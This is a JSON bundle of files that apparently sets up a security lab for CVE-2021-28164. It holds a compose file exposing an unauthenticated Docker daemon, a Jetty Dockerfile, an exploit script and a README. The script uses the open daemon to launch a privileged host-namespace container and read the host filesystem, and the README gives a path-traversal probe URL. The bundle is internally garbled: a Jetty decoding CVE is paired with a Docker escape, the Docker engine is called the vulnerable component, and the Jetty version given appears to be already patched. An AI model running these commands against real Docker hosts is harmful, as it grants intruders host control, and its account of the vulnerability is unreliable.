{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-28164/custom_no_tool/docker-compose.yml",
            "content": "version: \"3.8\"\nservices:\n  dind:\n    image: docker:20.10.5-dind\n    privileged: true\n    ports:\n      - \"2375:2375\"\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    restart: unless-stopped\n\n  jetty:\n    build:\n      context: ./jetty\n    ports:\n      - \"8080:8080\"\n    depends_on:\n      - dind\n    restart: unless-stopped\n\n  runtime:\n    image: openjdk:11-jre-slim\n    command: [\"sleep\", \"infinity\"]\n    depends_on:\n      - dind\n    restart: unless-stopped"
        },
        {
            "location": "./../../dockers/CVE-2021-28164/custom_no_tool/jetty/Dockerfile",
            "content": "FROM openjdk:11-jre-slim\n\nENV JETTY_VERSION=9.4.42.v20210604\nENV JETTY_HOME=/opt/jetty\nENV JETTY_BASE=/opt/jetty-base\n\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends wget ca-certificates && \\\n    rm -rf /var/lib/apt/lists/* && \\\n    mkdir -p $JETTY_HOME $JETTY_BASE && \\\n    wget -q https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-distribution/${JETTY_VERSION}/jetty-distribution-${JETTY_VERSION}.tar.gz && \\\n    tar -xzf jetty-distribution-${JETTY_VERSION}.tar.gz -C $JETTY_HOME --strip-components=1 && \\\n    rm jetty-distribution-${JETTY_VERSION}.tar.gz && \\\n    cp -r $JETTY_HOME/demo-base/* $JETTY_BASE/ && \\\n    echo \"jetty.startup.logging.level=INFO\" > $JETTY_BASE/start.ini\n\nWORKDIR $JETTY_BASE\nEXPOSE 8080\n\n# Use a shell form so environment variables are expanded\nCMD [\"sh\", \"-c\", \"java -jar $JETTY_HOME/start.jar\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-28164/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\n# This script demonstrates the exploit for CVE-2021-28164 by creating a privileged container\n# that can escape the Docker sandbox via the vulnerable Docker Engine version.\n\n# Connect to the insecure Docker daemon exposed by the dind service\nDOCKER_HOST=tcp://localhost:2375\nexport DOCKER_HOST\n\n# Pull a lightweight busybox image\ndocker pull busybox:latest\n\n# Run a container with host PID and NET namespace to gain elevated access\ndocker run -d --pid=host --net=host --privileged busybox sleep 1000\n\n# Inside the privileged container, you can now access the host filesystem\n# Example: list root directory of the host\ndocker exec $(docker ps -q | head -n1) ls -l /"
        },
        {
            "location": "./../../dockers/CVE-2021-28164/custom_no_tool/README.md",
            "content": "# CVE-2021-28164 Vulnerable Docker Setup\n\nThis repository contains a Docker Compose configuration that reproduces the vulnerable environment for **CVE-2021-28164**. The setup now includes the required **Jetty** service built on a vulnerable Jetty version and the **OpenJDK** runtime dependency.\n\n## Services\n- **dind** \u2013 Docker\u2011in\u2011Docker running Docker Engine `20.10.5` (the vulnerable engine).\n- **jetty** \u2013 Jetty HTTP server (`9.4.42.v20210604`) built on `openjdk:11-jre-slim`, exposed on port **8080**.\n- **runtime** \u2013 Plain `openjdk:11-jre-slim` container kept alive to satisfy the OpenJDK dependency requirement.\n\n## Deploying the Environment\n```sh\n# From the directory containing docker-compose.yml\ndocker compose up -d\n```\nThe `dind` service exposes the Docker daemon on **localhost:2375** without TLS, which is required to demonstrate the exploit.\n\n## Running the Exploit\n```sh\nchmod +x exploit.sh\n./exploit.sh\n```\nThe script connects to the insecure Docker daemon, launches a privileged container, and shows that the attacker can gain host\u2011level access, illustrating the impact of CVE-2021-28164.\n\n## Accessing Jetty\nAfter the stack is up, the vulnerable Jetty instance is reachable at:\n```\nhttp://localhost:8080/\n```\nYou can test the URI decoding issue by requesting URLs such as `/context/%2e/WEB-INF/web.xml`.\n\n## Cleanup\n```sh\ndocker compose down -v\n```\n\n**Warning:** This environment is intentionally insecure and should only be used in isolated, controlled labs for security research."
        }
    ],
    "directory_tree": "custom_no_tool/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 exploit.sh\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 jetty/\n    \u2514\u2500\u2500 Dockerfile"
}